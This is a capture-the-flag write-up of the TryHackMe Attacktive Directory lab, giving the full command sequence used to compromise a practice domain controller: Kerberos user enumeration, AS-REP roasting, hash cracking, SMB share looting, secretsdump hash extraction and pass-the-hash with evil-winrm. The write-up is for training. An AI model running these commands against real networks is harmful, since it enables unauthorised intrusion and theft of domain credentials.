#### Welcome to Attacktive Directory challenge from TryHackMe. Today I decided to learn how to attack Active Directory and I consider that this challenge was a great exercise. I practiced on tools already known as well as on tools that I did not know about before.

🔗 Link to the challenge: https://tryhackme.com/r/room/attacktivedirectory

🟠 Difficulty: Medium


⚙️ Tools: 

- [nmap](https://www.kali.org/tools/nmap/),
- [enum4linux](https://www.kali.org/tools/enum4linux/),
- [Kerbrute](https://github.com/ropnop/kerbrute), 
- [Impacket](https://www.kali.org/tools/impacket/) ([GetNPUsers.py](https://www.kali.org/tools/impacket-scripts/#impacket-getnpusers), [secretsdump.py](https://www.kali.org/tools/impacket/#impacket-secretsdump)), 
- [hashcat](https://www.kali.org/tools/hashcat/) OR [john](https://www.kali.org/tools/john/)
- [smbclient](https://www.kali.org/tools/samba/#smbclient), 
- [smbmap](https://www.kali.org/tools/smbmap/), 
- [cyberchef.io](https://cyberchef.io/), 
- [Evil-Winrm](https://www.kali.org/tools/evil-winrm/) 

💭 Note: `$Target_IP`= machine IP

🟢 State of the write-up: Final


----------------------------

🪜 Steps I followed (after deploying the machine and doing the necessary setup):

1. Add the DNS name and the machine IP in `/etc/hosts` 

2. Run an nmap scan
`nmap -sV $Target_IP`


 `-sV`
   is a flag used for Service/ version detection. It probes on open ports to determine service/ version info

Output: 


![nmap](https://github.com/user-attachments/assets/9fc46d3f-a6cf-4410-8acb-3d840e94aed0)


💭 The ports of our interest are 139 and 445. Ports 139 and 445 are associated with the Server Message Block (SMB) protocol, which is used for file sharing, printing, and other communication between devices on a network.


- 139: used by the older version of SMB (SMB1), which is known to have security vulnerabilities.
- 445: used by the newer versions of SMB (SMB2 and SMB3), which are more secure than SMB1.


3. Enumerate SMB ports `enum4linux $Target_IP`


In order to answer the question in **Task 3** _What tool will allow us to enumerate port 139/445_, I had a look on this [Medium blog](https://arnavtripathy98.medium.com/smb-enumeration-for-penetration-testing-e782a328bf1b). It helped me a lot to find out about tools to enumerate smb ports.
Thanks to enum4linux, we find out the NetBIOS-Domain name, useful also for the next question _What is the NetBIOS-Domain Name of the machine?_



![enum4linux](https://github.com/user-attachments/assets/757b4fd6-ea9e-40b6-a053-16e08b3324db)


💡 Much more obvious, the NetBIOS-Domain name is visible in the output resulted from the nmap scan! 🔽

![netbios](https://github.com/user-attachments/assets/0876e46b-06f2-4f5d-b959-7e269ae44f17)

💭 **NetBIOS** is a legacy networking protocol that's been mostly replaced by more modern protocols like TCP/IP. However, it's still relevant because some systems and applications might still use it under the hood.

**NetBIOS_Domain** specifically refers to a workgroup or domain name that's used in a Windows network environment. It helps identify a group of computers that can share resources with each other.



Back to our quest, from the same output we can extract the TLD used by people for their Active Directory Domain, helping us with the question _What invalid TLD do people commonly use for their Active Directory Domain?_

![ghg](https://github.com/user-attachments/assets/bd2f8694-d560-4859-bb32-2cd40f17f1cf)


💭 TLD stands for Top-Level Domain. It's the last part of a domain name, which is located after the final dot. For example, in "www.example.com", the TLD is ".com".


4. Enumerate Users via Kerberos
   

As noticed in the nmap output, port 88 is open. It is associated with Kerberos protocol.

Command:  `./kerbrute_linux_amd64 userenum --dc spookysec.local -d THM-AD ./userlist`
 
- before executing, "kerbrute_linux_amd64" can be changed in "kerbrute" for easiness in typing
-  give `chmod 755` (meaning rwxr-xr-x) permissions to the tool and execute it
-  **userlist** is a text file that contains the user list provided in **Task 4**, alongside with the password list




![kerbrute](https://github.com/user-attachments/assets/5b9b9bc5-c19f-4157-9273-705c608bb7eb)

    

   Two users of interest are svc-admin and backup.

   - svc-admin could be a service account. This [article](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) helped me understand more about service accounts.
   - backup is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes _password hashes_  (as reffered in **Task 7**)

 Now that we have the answers for the questions:

- _What command within Kerbrute will allow us to enumerate valid username?_
- _What notable account is discovered?_
- _What is the other notable account discovered?_

  ...We can go to the next step:
  

5. Abuse Kerberos

     `python3 GetNPUsers.py spookysec.local/svc-admin -no-pass`

  Given that the task said _We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?_, I made the link to the previous two questions and I tried my shot with svc-admin. Normally, the list of users found through Kerbrute has to be placed in a text file in the form username@domainname (for example john@THM-ADM) and used in the ASREPRoasting attack.

   ![getnpusers](https://github.com/user-attachments/assets/e778dbd8-4c7e-4ce0-846d-75fa48ab306e)


We have the Ticket Grating Ticket (TGT)! It's safe to proceed to:

6. Crack the hash

Respecting the steps from **Task 5**, we find _what type of Kerberos hash_ we retrieved from the KDC:

![krb](https://github.com/user-attachments/assets/b6ea3dda-b587-4d7e-bb66-f025f76e6ad5)

This helps us to retrieve the mode (18200)


![Screenshot 2024-08-26 010217](https://github.com/user-attachments/assets/32122df5-2510-4863-be49-cd30a6ab2acc)


The following command will be used:

`hashcat -m 18200 -a 0 hash.txt passwdlist`

- -a is the defined charset
- 0 is the Straight mode
- hash.txt is the file where the TGT was saved
- passwdlist is the Password List mentioned in **Task 4**

![](https://github.com/user-attachments/assets/f419f1a8-02cd-4698-9365-644dcfcb303d)




Besides hashcat, there is also john:

`john hash.txt --wordlist==passwdlist`

![](https://github.com/user-attachments/assets/a1be34bb-a4f3-4574-920c-dd9b357c56e1)



7. Enumerate the shares

In order to map remote SMB shares, we use the smbclient utility. To list the shares, `-L` option will be used.

`smbclient -L $Target_IP -U spookeysec.local/svc-admin`

![](https://github.com/user-attachments/assets/d95fea01-9da0-4a01-b4fd-ed3bab716977)

To see what type of access each share has, the following command is used:

`smbmap -u svc-admin -p ********* -d spookysec.local -H $Target_IP`



![](https://github.com/user-attachments/assets/a477e683-220b-449f-94b8-c543faa71858)

- -p is the password obtained earlier
- as it can be seen, the connection is made to port 445

 `smbclient \\\\$Target_IP\\backup -U svc-admin` makes a connection on the backup share
  
![](https://github.com/user-attachments/assets/c3db9527-45d7-41b5-bbea-3d9369bad23b)

The file backup_credentials.txt will be downloaded into our machine, using `get` command.

8. Read the content of the file obtained from the share

![](https://github.com/user-attachments/assets/034dbc05-c523-47a0-946c-53e16ef4459d)

9. Use a decryption tool to obtain the plaintext

 ![](https://github.com/user-attachments/assets/8975fc37-d2dd-4bb5-bb46-9e7ed0cb130e)

   The text is base64 encrypted.
   

As the answers for the questions:
_How many remote shares is the server listing?_
_There is one particular share that we have access to that contains a text file. Which share is it?_
_What is the content of the file?_
_Decoding the contents of the file, what is the full contents?_

...we can move on to:

10. Elevate privileges within the domain

`python3 secretsdump.py -just-dc spookysec.local/ackup:*****@$Target_IP`
   
![](https://github.com/user-attachments/assets/d53c2072-bd23-42d8-8f82-46cb22c1471d)

The output is much longer. 

Directory Replication Service Remote Protocol (DRSUAPI) is used by domain controllers to replicate Active Directory objects between controllers

I found out more about the NTDS.DIT file [here](https://medium.com/@harikrishnanp006/understanding-ntds-dit-the-core-of-active-directory-faac54cc628a#:~:text=DIT%3F-,NTDS.,Domain%20Services%20(AD%20DS)).

The Administrators NTLM hash is squared in the screeenshot. Pass the Hash acts As a _method of attack to authenticate as the user without the password_.

💭Pass the Hash is a technique where an attacker captures a password hash (as opposed to the password characters) and then passes it through for authentication and lateral access to other networked systems. With this technique, the threat actor doesn’t need to decrypt the hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques. ([source](https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack))

Thanks to Evil-WinRM tool and its option -H, we are allowed to _use a hash_.

`evil-winrm -i $Target_IP -u administrator -H (hash obtained earlier)`

![](https://github.com/user-attachments/assets/79ae0a98-c12e-4253-9d47-760a1a2d817a)


11. Search for loot

Earlier we already climbed on step 11. Now that we got a Powershell session on the victim's machine, let's search for loot.

![](https://github.com/user-attachments/assets/46c95851-eee7-4f5f-a8f9-498877ea9eb2)


![](https://github.com/user-attachments/assets/c731cebd-88a6-4457-ae76-fa7012ca76b3)

![](https://github.com/user-attachments/assets/36872068-1950-4a23-a4a3-b2cc6145bea8)


![](https://github.com/user-attachments/assets/20f42b67-8b23-4026-bce3-c8bd545047b4)


-----------------------------------------------------
🥷 That was all. From enumeration to exploitation and privilege escalation, I hope you enjoyed this write-up and you learnt something valuable. 

